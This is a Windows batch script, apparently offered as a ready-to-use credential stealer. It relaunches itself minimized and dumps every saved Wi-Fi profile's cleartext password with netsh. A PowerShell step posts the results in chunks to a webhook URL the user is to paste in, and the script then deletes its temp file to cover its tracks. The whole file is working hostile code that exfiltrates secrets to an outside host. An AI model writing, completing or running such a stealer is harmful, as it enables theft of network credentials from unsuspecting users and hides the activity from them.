@echo off
setlocal

rem If not already running minimized, relaunch self minimized and exit
if not "%~1"=="min" (
    start "" /min cmd /c "%~f0" min
    exit
)

rem === PASTE YOUR FULL WEBHOOK URL HERE ===
set "WEBHOOK=https://YOUR WEBHOOK HERE"

set "OUTPUT=%TEMP%\wlan_dump.txt"

break > "%OUTPUT%"

for /f "skip=9 tokens=1,2 delims=:" %%i in ('netsh wlan show profiles') do (
    if "%%j" NEQ " " (
        echo SSID: %%j >> "%OUTPUT%"
        netsh wlan show profiles %%j key=clear | findstr "Key Content" >> "%OUTPUT%"
        echo. >> "%OUTPUT%"
    )
)

powershell -NoProfile -Command "$c = Get-Content -Raw '%OUTPUT%'; $max = 1900; for ($i=0; $i -lt $c.Length; $i += $max) { $len = [Math]::Min($max, $c.Length - $i); $body = @{ content = ('```' + $c.Substring($i, $len) + '```') } | ConvertTo-Json; Invoke-RestMethod -Uri '%WEBHOOK%' -Method Post -Body $body -ContentType 'application/json' }"

del "%OUTPUT%" > nul 2>&1
exit